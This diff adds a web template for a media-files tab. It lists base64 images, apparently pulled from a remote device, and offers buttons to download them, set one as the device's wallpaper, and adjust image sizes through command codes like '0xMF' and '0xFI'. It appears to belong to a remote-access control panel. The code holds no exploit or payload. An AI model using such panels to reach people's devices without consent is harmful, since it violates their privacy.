@@ -1,0 +1,131 @@
+
+
+<div class="ui top attached tabular inverted white menu" style="
+    margin-left: 0!important;
+    margin-right: 0!important;">
+    <a class="item active" data-tab="images">
+        Images
+    </a>
+    <a class="item" data-tab="settings">
+        Images Settings
+    </a>
+    
+    <div class="right menu">
+        <button onclick="updateButton(this, '0xMF', {'action': 'getList'})" class="ui blue button"> <i
+                class="icon sync"></i>Update</button>
+    </div>
+</div>
+
+<div class="ui bottom attached tab segment active" data-tab="images">
+    <p>Click on the image to download</p>
+    <table class="ui celled table">
+        <tbody id="ma" style="white-space: nowrap;">
+            <% 
+                let widthS;
+                let heightS;
+
+
+
+            pageData.forEach((item) => { 
+                    if(item.width !== undefined && item.height !== undefined){
+                            widthS= item.width;
+                            heightS = item.height;
+                            return;
+                    }
+                    let srcT = "data:image/png;base64,"+item.imgData;
+                    let deleted = item.deleted;
+                    if(item.imgData == undefined)
+                    	return;
+                %>
+                <div class="mf_div" style="display: inline-block; position: relative;">
+                	<img id="btmImage" src="data:image/png;base64,<%=item.imgData%>" style="margin:10px;" alt="<%=item.name %>" class="btmImage" <% if(deleted){ %> title="Изображение удалено" <% } %> > 
+                	<div class="mf_btnhidden" <% if(deleted){ %> hidden title="Изображение удалено" <% } %>>
+                		<button class="ui icon button" title="Скачать эту картинку" onclick="save('<%=item.path %>') ">
+            				<i class="icon download"></i>
+	                	</button>
+	                	<button class="ui icon button" title="Установить как обои" onclick="setWall('<%=item.path %>') ">
+	                		<i class="image icon"></i>
+	                	</button>
+                	</div>
+
+                </div>
+                
+
+            <% }) %>
+        </tbody>
+    </table>
+</div>
+
+
+<!--Settings -->
+<div class="ui bottom attached tab segment" data-tab="settings">
+    <button class="positive ui button" onclick="defaultSettings(this)">Set default</button><br>
+    <p></p>
+    <p style="color: white;margin: 0!important;">Ширина</p>
+    <div class="ui labeled input">
+        <input type="number" placeholder="Width" id="width" min="20" max="1280" value="<%=widthS %>">
+    </div>
+    <p style="color: white; margin: 0!important;">Высота</p>
+    <div class="ui right labeled input">
+        <input type="number" placeholder="Height" id="height" min="20" max="1280" value="<%=heightS %>">
+    </div>
+    <button class="positive ui button" onclick="updateSettings()">SET</button>
+</div>
+
+<script type="text/javascript">
+    $('.menu .item').tab();
+    function save(path){
+
+        sendCommand('0xFI', {
+            action: 'dl',
+            path
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                }, 300)
+            } else {
+                if (message === 'Requested') {
+                    setTimeout(() => {
+                        showNotification('#2ecc71', 'Save File '+ name);
+                    }, 300)
+                }
+            }
+        });
+    }
+
+    function setWall(path){
+
+        sendCommand('0xMF', {
+            action: 'sW',
+            path
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                }, 300)
+            } else {
+                if (message === 'Requested') {
+                    setTimeout(() => {
+                        showNotification('#2ecc71', 'Set WallPaper '+ name);
+                    }, 300)
+                }
+            }
+        });
+    }
+
+    function defaultSettings(element){
+        $.post(baseURL + '/MFSET/128/128', function (data) {
+            if (data.error) showNotification('#f03434', data.error)
+            else showNotification('#2ecc71', 'MediaFiles Settings Updated!');
+        });
+    }
+
+    function updateSettings(){
+        $.post(baseURL + '/MFSET/' + $('#width').val() +'/' +$('#height').val(), function (data) {
+            if (data.error) showNotification('#f03434', data.error)
+            else showNotification('#2ecc71', 'MediaFiles Settings Updated!');
+        });
+    }
+
+</script>
